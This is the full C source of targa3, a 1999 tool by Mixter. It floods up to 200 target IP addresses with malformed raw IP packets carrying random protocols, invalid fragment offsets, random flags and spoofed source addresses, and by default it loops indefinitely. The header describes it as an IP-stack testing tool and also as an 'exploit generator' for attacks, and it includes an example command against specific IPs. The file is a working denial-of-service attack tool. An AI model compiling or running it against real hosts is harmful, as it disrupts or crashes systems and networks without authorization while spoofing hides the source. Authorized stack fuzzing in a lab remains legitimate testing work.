/*
 * targa3 - 1999 (c) Mixter <mixter@newyorkoffice.com>
 *
 * IP stack penetration tool / 'exploit generator'
 * Sends combinations of uncommon IP packets to hosts
 * to generate attacks using invalid fragmentation, protocol,
 * packet size, header values, options, offsets, tcp segments,
 * routing flags, and other unknown/unexpected packet values.
 * Useful for testing IP stacks, routers, firewalls, NIDS,
 * etc. for stability and reactions to unexpected packets.
 * Some of these packets might not pass through routers with
 * filtering enabled - tests with source and destination host
 * on the same ethernet segment gives best effects.
 * 
 * Example:
 * ./targa3 193.116.54.15 192.88.209.18 134.205.131.22 -c 1000
 * 
 * Linux, *BSD:
 * cc -Wall -O2 -s -o targa3 targa3.c
 * IRIX, HPUX, OSF (untested yet):
 * cc -ldld -o targa3 targa3.c
 * Solaris, SunOS:
 * cc -lnsl -lsocket -o targa3 targa3.c
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>

u_char rseed[4096];
int rsi, rnd, pid;

#if __BYTE_ORDER == __LITTLE_ENDIAN
#ifndef htons
unsigned short int htons (unsigned short int hostshort);
#endif
#define TONS(n) htons(n)
#elif __BYTE_ORDER == __BIG_ENDIAN
#define TONS(n) (n)
#endif

struct sa_in
  {
    unsigned short int sin_family, sin_port;
    struct
      {
	unsigned int s_addr;
      }
    sin_addr;
    unsigned char sin_zero[8];
  };

struct iph
  {				/* IP header */
#if __BYTE_ORDER == __LITTLE_ENDIAN
#define TONS(n) htons(n)
    unsigned char ihl:4;
    unsigned char version:4;
#elif __BYTE_ORDER == __BIG_ENDIAN
#define TONS(n) (n)
    unsigned char version:4;
    unsigned char ihl:4;
#endif
    unsigned char tos;
    unsigned short int tot_len;
    unsigned short int id;
    unsigned short int frag_off;
    unsigned char ttl;
    unsigned char protocol;
    unsigned short int check;
    unsigned int saddr;
    unsigned int daddr;
  };

unsigned long int inet_addr (const char *cp);

unsigned int
realrand (int low, int high)
{
  int evil[2];
  evil[0] = rseed[rsi];
  evil[1] = rseed[rsi + 1];
  rsi += 2;
  if (evil[0] == 0x00)
    evil[0]++;
  if (evil[1] == 0x00)
    evil[1]++;
  srandom (time (0));
  srand (random () << pid % evil[0] >> evil[1]);	/* don't ask :P */
  return ((rand () % (int) (((high) + 1) - (low))) + (low));
}

void
sigh (int sig)
{
  puts (" ] [0m\n");
  exit (0);
}

int
main (int argc, char **argv)
{
  int s = socket (AF_INET, SOCK_RAW, 255);	/* IPPROTO_RAW */
  int res, psize, loopy, targets = 0, tind, count = -1;
  char *packet, ansi[16];
  struct sa_in sin;
  struct iph *ip;
  u_long target[200];

  int proto[14] =
  {				/* known internet protcols */
    0, 1, 2, 4, 6, 8, 12, 17, 22, 41, 58, 255, 0,
  };
  int frags[10] =
  {				/* (un)common fragment values */
    0, 0, 0, 8192, 0x4, 0x6, 16383, 1, 0,
  };
  int flags[7] =
  {				/* (un)common message flags */
    0, 0, 0, 0x4, 0, 0x1,
  };

  rnd = open ("/dev/urandom", O_RDONLY);
  read (rnd, rseed, 4095);
  rsi = 0;

  snprintf (ansi, 15, "[%d;3%dm", realrand (0, 1), realrand (1, 7));
  printf ("\t\t%starga 3.0 by Mixter[0m\n", ansi);
  fflush (stdout);

  if (argc < 2)
    {
      fprintf (stderr, "usage: %s <ip1> [ip2] ... [-c count]\n", argv[0]);
      exit (-1);
    }

  if (argc > 201)
    {
      fprintf (stderr, "cannot target more than 200 hosts!\n");
      exit (-1);
    }

  for (loopy = 1; loopy < argc; loopy++)
    {
      if (strcmp (argv[loopy - 1], "-c") == 0)
	{
	  if (atoi (argv[loopy]) > 1)
	    count = atoi (argv[loopy]);
	  continue;
	}
      if (inet_addr (argv[loopy]) != -1)
	{
	  target[targets] = inet_addr (argv[loopy]);
	  targets++;
	}
    }

  if (!targets)
    {
      fprintf (stderr, "no valid ips found!\n");
      exit (-1);
    }

  snprintf (ansi, 15, "[%d;3%dm", realrand (0, 1), realrand (1, 7));
  printf ("%s\tTargets:\t%d\n", ansi, targets);
  printf ("\tCount:\t\t");
  if (count == -1)
    puts ("infinite");
  else
    printf ("%d\n", count);

  printf ("   [ ");
  fflush(0);

  for (res = 0; res < 18; res++)
    signal (res, sigh);

  pid = getpid ();
  psize = sizeof (struct iph) + realrand (128, 512);
  packet = calloc (1, psize);
  ip = (struct iph *) packet;

  setsockopt (s, 0, 3, "1", sizeof ("1"));	/* IP_HDRINCL: header included */
  sin.sin_family = PF_INET;
  sin.sin_port = TONS (0);
  while (count != 0)
    {
      if (count != -1)
	count--;
      for (loopy = 0; loopy < 0xff;)
	{
	  for (tind = 0; tind < targets + 1; tind++)
	    {
	      sin.sin_addr.s_addr = target[tind];
	      if (rsi > 4000)
		{
		  read (rnd, rseed, 4095);
		  rsi = 0;
		}
	      read (rnd, packet, psize);
	      proto[13] = realrand (0, 255);
	      frags[9] = realrand (0, 8100);
	      flags[6] = realrand (0, 0xf);
	      ip->version = 4;
	      ip->ihl = 5;
	      ip->tos = 0;
	      ip->tot_len = TONS (psize);
	      ip->id = TONS (realrand (1, 10000));
	      ip->ttl = 0x7f;
	      ip->protocol = proto[(int) realrand (0, 13)];
	      ip->frag_off = TONS (frags[(int) realrand (0, 9)]);
	      ip->check = 0;
	      ip->saddr = random ();
	      ip->daddr = target[tind];
	      res = sendto (s,
			    packet,
			    psize,
			    flags[(int) realrand (0, 6)],
			    (struct sockaddr *) &sin,
			    sizeof (struct sockaddr));
	      if (res)
		loopy++;
	    }
	}
      snprintf (ansi, 15, "[%d;3%dm", realrand (0, 1), realrand (1, 7));
      printf ("%s.", ansi);
      fflush (stdout);
    }

  free (packet);		/* free willy */

  puts (" ][0m\n");

  return 0;
}

/* After cutting this line, md5sum will be 6550270c101b4895c8c0fb4b75881421 */